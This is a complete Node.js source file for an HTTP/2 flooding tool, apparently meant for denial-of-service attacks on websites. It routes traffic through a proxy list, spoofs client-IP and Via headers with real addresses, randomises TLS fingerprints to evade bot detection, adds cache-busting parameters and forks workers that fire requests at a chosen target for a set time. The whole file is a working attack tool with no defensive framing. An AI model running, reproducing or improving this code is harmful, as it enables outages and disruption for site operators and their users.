const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const url = require('url');
const fs = require('fs').promises;
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');

// Error suppression from q.js
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND'];

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.on('uncaughtException', (e) => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
});
process.on('unhandledRejection', (e) => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
});

// Utility function to shuffle arrays (from q.js)
function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

// Generate JA3 fingerprint for TLS (from q.js)
function generateJA3Fingerprint() {
    const ciphers = [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
        'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA'
    ];

    const signatureAlgorithms = [
        'ecdsa_secp256r1_sha256',
        'rsa_pss_rsae_sha256',
        'rsa_pkcs1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha384'
    ];

    const curves = [
        'X25519',
        'secp256r1',
        'secp384r1'
    ];

    const shuffledCiphers = shuffle([...ciphers]).slice(0, Math.floor(Math.random() * 4) + 6);
    const shuffledSigAlgs = shuffle([...signatureAlgorithms]).slice(0, Math.floor(Math.random() * 2) + 3);
    const shuffledCurves = shuffle([...curves]);

    return {
        ciphers: shuffledCiphers,
        signatureAlgorithms: shuffledSigAlgs,
        curves: shuffledCurves
    };
}

const ja3Fingerprint = generateJA3Fingerprint();
const enableCache = process.argv.includes('--cache');

// Utility class
class Utils {
    static randomString(length) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    }

    static randomElement(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    static generateLegitIP() {
        const asnData = [
            { ip: "8.8.8." },
            { ip: "13.107.21." },
            { ip: "104.18.32." },
            { ip: "162.158.78." },
            { ip: "3.120.0." },
            { ip: "52.192.0." },
            { ip: "157.240.0." },
            { ip: "104.244.42." },
            { ip: "69.171.250." }
        ];
        const data = asnData[Math.floor(Math.random() * asnData.length)];
        return `${data.ip}${Math.floor(Math.random() * 255)}`;
    }
}

// Proxy connection class (adapted from q.js)
class ProxyConnection {
    static async connect(proxy, target) {
        const [proxyHost, proxyPort] = proxy.split(':');
        if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
            throw new Error('Invalid proxy format');
        }

        return new Promise((resolve, reject) => {
            const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
                const legitIP = Utils.generateLegitIP();
                const connectRequest = `CONNECT ${target.host}:443 HTTP/1.1\r\n` +
                                      `Host: ${target.host}:443\r\n` +
                                      `Client-IP: ${legitIP}\r\n` +
                                      `X-Client-IP: ${legitIP}\r\n` +
                                      `Via: 1.1 ${legitIP}\r\n` +
                                      `Connection: keep-alive\r\n\r\n`;
                netSocket.write(connectRequest);

                netSocket.once('data', (data) => {
                    if (data.toString().includes('HTTP/1.1 200')) {
                        resolve(netSocket);
                    } else {
                        netSocket.destroy();
                        reject(new Error('Proxy connection failed'));
                    }
                });
            });

            netSocket.on('error', (err) => {
                netSocket.destroy();
                reject(err);
            });

            netSocket.on('close', () => {
                reject(new Error('Proxy connection closed'));
            });
        });
    }
}

// Headers class
class Headers {
    static getHeaders(target) {
        let path = target.path || '/';
        if (enableCache) {
            const randomParam = Utils.randomString(5);
            path += `?${randomParam}=${Utils.randomString(10)}`;
        }

        const headers = {
            ':method': 'GET',
            ':authority': target.host,
            ':scheme': 'https',
            ':path': path,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        };

        if (enableCache) {
            headers['cache-control'] = 'no-cache, no-store, must-revalidate';
            headers['pragma'] = 'no-cache';
        }

        return headers;
    }
}

// Main Flooder class
class Flooder {
    constructor({ target, time, rate, threads, proxyFile }) {
        this.target = url.parse(target);
        this.duration = time * 1000;
        this.rate = rate;
        this.threads = threads;
        this.proxyFile = proxyFile;
        this.proxies = [];
        this.isRunning = false;
    }

    async initialize() {
        try {
            const allProxies = await fs.readFile(this.proxyFile, 'utf-8').then(data => data.split(/\r?\n/).filter(Boolean));
            this.proxies = allProxies;
            console.log(`[INFO] Loaded ${this.proxies.length} proxies`);
        } catch (error) {
            throw new Error(`Failed to load proxies: ${error.message}`);
        }
    }

    async start() {
        if (this.isRunning) return;
        this.isRunning = true;

        if (cluster.isMaster) {
            console.log(`[INFO] Starting ${this.threads} workers`);
            for (let i = 0; i < this.threads; i++) {
                cluster.fork();
            }
        } else {
            this.runWorker();
        }

        setTimeout(() => process.exit(0), this.duration);
    }

    runWorker() {
        const runFlooder = async () => {
            const proxy = Utils.randomElement(this.proxies);
            try {
                const connection = await ProxyConnection.connect(proxy, this.target);
                const headers = Headers.getHeaders(this.target);

                const tlsConn = tls.connect({
                    socket: connection,
                    host: this.target.host,
                    servername: this.target.host,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    ciphers: ja3Fingerprint.ciphers.join(':'),
                    sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
                    ecdhCurve: ja3Fingerprint.curves.join(':'),
                    minVersion: 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
                                   crypto.constants.SSL_OP_NO_SSLv3 |
                                   crypto.constants.SSL_OP_NO_TLSv1 |
                                   crypto.constants.SSL_OP_NO_TLSv1_1 |
                                   crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                                   crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                                   crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
                                   crypto.constants.SSL_OP_COOKIE_EXCHANGE |
                                   crypto.constants.SSL_OP_SINGLE_DH_USE |
                                   crypto.constants.SSL_OP_SINGLE_ECDH_USE,
                    session: crypto.randomBytes(64),
                    rejectUnauthorized: false
                });

                tlsConn.setKeepAlive(true, 60000);

                const client = http2.connect(this.target.href, {
                    settings: {
                        headerTableSize: 65536,
                        maxHeaderListSize: 32768,
                        initialWindowSize: 6291456,
                        maxFrameSize: 16384,
                    },
                    createConnection: () => tlsConn,
                });

                client.on('connect', () => {
                    setInterval(() => {
                        for (let i = 0; i < this.rate; i++) {
                            const req = client.request(headers);
                            req.on('response', () => req.close());
                            req.on('error', () => {});
                            req.end();
                        }
                    }, 300);
                });

                client.on('error', (err) => {
                    console.error(`[ERROR] HTTP/2 error: ${err.message}`);
                    client.destroy();
                    tlsConn.destroy();
                    connection.destroy();
                });

                client.on('close', () => {
                    client.destroy();
                    tlsConn.destroy();
                    connection.destroy();
                });
            } catch (err) {
                console.error(`[ERROR] Flood error: ${err.message}`);
            }
        };

        setInterval(runFlooder, 1000 / this.rate);
    }
}

// Command-line arguments
if (process.argv.length < 7) {
    console.log('Usage: node flooder.js <target> <time> <rate> <threads> <proxyfile> [--cache]');
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]) || os.cpus().length,
    proxyFile: process.argv[6],
};

async function main() {
    const flooder = new Flooder({
        target: args.target,
        time: args.time,
        rate: args.rate,
        threads: args.threads,
        proxyFile: args.proxyFile,
    });

    try {
        await flooder.initialize();
        await flooder.start();
    } catch (error) {
        console.error(`[ERROR] Startup failed: ${error.message}`);
        process.exit(1);
    }
}

main().catch(console.error);